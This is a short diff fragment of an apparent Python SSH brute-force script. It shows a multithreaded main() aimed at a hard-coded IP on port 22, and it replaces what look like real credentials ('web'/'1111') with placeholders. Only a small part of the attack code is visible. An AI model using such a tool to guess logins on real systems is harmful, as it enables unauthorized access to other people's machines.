@@ -13,10 +13,10 @@ def ssh_brute(ip, port, username, password):
         print(f"Failed: IP: {ip}, Username: {username}, Password: {password}")
 
 def main():
-    target_ip = "172.100.43.251"
+    target_ip = "172.100.43.251" # IP Target
     target_port = 22
-    username="web"
-    password="1111"
+    username="fake_user"
+    password="fake_password"
 
     threads = []
     for i in range(100):
